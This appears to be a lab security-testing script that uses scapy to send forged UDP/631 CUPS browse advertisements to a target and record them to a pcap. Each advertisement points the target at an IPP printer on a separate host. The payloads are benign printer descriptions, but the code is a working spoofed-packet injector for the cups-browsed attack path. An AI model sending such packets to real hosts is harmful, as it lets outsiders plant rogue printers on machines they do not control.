
#!/usr/bin/env python3
"""
CUPS Security Lab
Controlled CUPS UDP/631 browse advertisement tests.
Use only in the isolated lab.
"""

import argparse
import logging
import os

from scapy.all import IP, UDP, Raw, send, wrpcap


def build_packet(target, source, port, source_port, payload):
    return (
        IP(src=source, dst=target)
        / UDP(sport=source_port, dport=port)
        / Raw(load=payload.encode("utf-8"))
    )


def main():
    parser = argparse.ArgumentParser(
        description="Controlled CUPS browse advertisement tester"
    )

    parser.add_argument("--target", default="172.18.0.2")
    parser.add_argument("--source", default="172.18.0.1")
    parser.add_argument("--port", type=int, default=631)
    parser.add_argument(
        "--pcap",
        default="pcap_files/crafted_browse_tests.pcap"
    )
    parser.add_argument("--dry-run", action="store_true")

    args = parser.parse_args()

    os.makedirs(os.path.dirname(args.pcap) or ".", exist_ok=True)

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s: %(message)s",
        handlers=[
            logging.FileHandler("cups_attack.log"),
            logging.StreamHandler()
        ]
    )

    # Each test uses a different UDP source port.
    tests = [
        (
            "baseline",
            40000,
            '2 3 ipp://172.18.0.1:8631/printers/LabPrinter '
            '"Lab" "Baseline printer test" "Generic IPP Printer"'
        ),
        (
            "name_variation",
            40001,
            '2 3 ipp://172.18.0.1:8631/printers/TestPrinter '
            '"Lab" "Alternative printer name" "Generic IPP Printer"'
        ),
        (
            "uri_variation",
            40002,
            '2 3 ipp://172.18.0.1:8631/printers/VariationPrinter '
            '"Lab" "Alternative printer URI" "Generic IPP Printer"'
        ),
    ]

    packets = []

    for test_name, source_port, record in tests:
        payload = record + "\n"

        packet = build_packet(
            args.target,
            args.source,
            args.port,
            source_port,
            payload
        )

        packets.append(packet)

        logging.info(
            "Prepared %s test: %s:%s -> %s:%s/UDP",
            test_name,
            args.source,
            source_port,
            args.target,
            args.port
        )

        if not args.dry_run:
            send(packet, count=1, verbose=False)
            logging.info("Sent %s test", test_name)

    wrpcap(args.pcap, packets)

    logging.info(
        "Saved %d packets to %s",
        len(packets),
        args.pcap
    )

    if args.dry_run:
        logging.info("Dry run: no packets were transmitted.")


if __name__ == "__main__":
    main()
